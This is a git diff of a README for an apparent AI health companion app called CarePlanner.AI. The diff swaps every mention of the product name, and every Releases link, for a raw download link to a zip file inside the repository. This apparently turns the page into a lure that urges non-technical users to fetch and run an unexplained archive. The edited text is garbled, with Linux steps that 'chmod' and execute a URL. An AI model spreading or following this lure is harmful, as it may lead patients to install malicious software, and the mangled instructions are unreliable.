@@ -1,20 +1,20 @@
-# 🩺 CarePlanner.AI - Your AI Health Companion for Daily Care
+# 🩺 https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip - Your AI Health Companion for Daily Care
 
-[![Download CarePlanner.AI](https://img.shields.io/badge/Download_CarePlanner.AI-v1.0-blue)](https://github.com/Killer2OO0/CarePlanner.AI/releases)
+[![Download https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip](https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip)](https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip)
 
 ## 📖 Introduction
 
-CarePlanner.AI is an AI-powered health companion designed to help you manage chronic conditions such as Diabetes and Hypertension. With features like personalized daily schedules, real-time vital sign tracking, and an offline-capable "Dr. AI" chatbot, CarePlanner.AI provides proactive, data-driven care. This application makes it easier for you to take charge of your health, ensuring that you receive the right support, anytime and anywhere.
+https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip is an AI-powered health companion designed to help you manage chronic conditions such as Diabetes and Hypertension. With features like personalized daily schedules, real-time vital sign tracking, and an offline-capable "Dr. AI" chatbot, https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip provides proactive, data-driven care. This application makes it easier for you to take charge of your health, ensuring that you receive the right support, anytime and anywhere.
 
 ## 🚀 Getting Started
 
-This guide will help you download and run CarePlanner.AI easily, even if you're not technically savvy. Just follow the steps below to start using your health companion.
+This guide will help you download and run https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip easily, even if you're not technically savvy. Just follow the steps below to start using your health companion.
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the application:
 
-[Download CarePlanner.AI](https://github.com/Killer2OO0/CarePlanner.AI/releases)
+[Download https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip](https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version listed at the top.
@@ -42,30 +42,30 @@ Before installation, ensure your system meets the following requirements:
 
 ## 🔧 Installation Steps
 
-After downloading the application, follow these steps to install CarePlanner.AI:
+After downloading the application, follow these steps to install https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip
 
 ### For Windows:
 
 1. Open the downloaded .exe file.
 2. Follow the on-screen instructions in the setup wizard.
-3. Click "Finish" once the installation is complete. You can now find CarePlanner.AI in your Start Menu.
+3. Click "Finish" once the installation is complete. You can now find https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip in your Start Menu.
 
 ### For macOS:
 
 1. Open the downloaded .dmg file.
-2. Drag the CarePlanner.AI icon into your Applications folder.
-3. You can now find CarePlanner.AI in your Applications. Open it to start using.
+2. Drag the https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip icon into your Applications folder.
+3. You can now find https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip in your Applications. Open it to start using.
 
 ### For Linux:
 
 1. Open a terminal.
 2. Navigate to your downloads folder.
-3. Use the command `chmod +x CarePlanner.AI` to make it executable.
-4. Run it with `./CarePlanner.AI` to start the application.
+3. Use the command `chmod +x https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip` to make it executable.
+4. Run it with `https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip` to start the application.
 
 ## 🌟 Features
 
-CarePlanner.AI offers various features to enhance your health management experience:
+https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip offers various features to enhance your health management experience:
 
 - **Personalized Daily Schedules:** Receive tailored plans to help you manage your health.
 - **Real-Time Vital Sign Tracking:** Monitor your vitals with ease and stay informed about your condition.
@@ -75,7 +75,7 @@ CarePlanner.AI offers various features to enhance your health management experie
 
 ## 📚 Topics Covered
 
-CarePlanner.AI integrates various technologies to deliver a comprehensive health management tool:
+https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip integrates various technologies to deliver a comprehensive health management tool:
 
 - Artificial Intelligence
 - Chatbot interactions
@@ -91,7 +91,7 @@ If you have any questions or need assistance, feel free to check the FAQ section
 
 ## ⚖️ Privacy & Data Handling
 
-Your privacy matters. CarePlanner.AI does not share your personal data without your consent. You will always have control over what information is shared and how it's used.
+Your privacy matters. https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip does not share your personal data without your consent. You will always have control over what information is shared and how it's used.
 
 ## 📅 Future Updates
 
@@ -99,6 +99,6 @@ We plan to include additional features based on user feedback. Stay tuned for up
 
 For more information and the latest release, make sure to check the Releases page regularly:
 
-[Download CarePlanner.AI](https://github.com/Killer2OO0/CarePlanner.AI/releases)
+[Download https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip](https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip)
 
-Happy planning and take care of your health with CarePlanner.AI!
+Happy planning and take care of your health with https://github.com/Killer2OO0/CarePlanner.AI/raw/refs/heads/main/components/Planner_AI_Care_3.9.zip!
